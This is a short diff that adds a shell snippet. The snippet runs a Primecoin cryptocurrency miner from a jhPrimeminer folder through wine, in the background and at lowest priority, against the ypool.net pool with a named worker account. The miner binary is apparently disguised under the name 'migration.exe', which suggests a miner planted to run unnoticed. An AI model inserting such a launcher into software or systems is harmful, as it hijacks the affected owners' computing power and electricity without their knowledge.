@@ -1,0 +1,3 @@
+cd ~/jhPrimeminer
+nice -n 20 /usr/bin/wine migration.exe -o ypool.net -port 8086 -u newssub.XPM_1 -p x -t 3 &
+
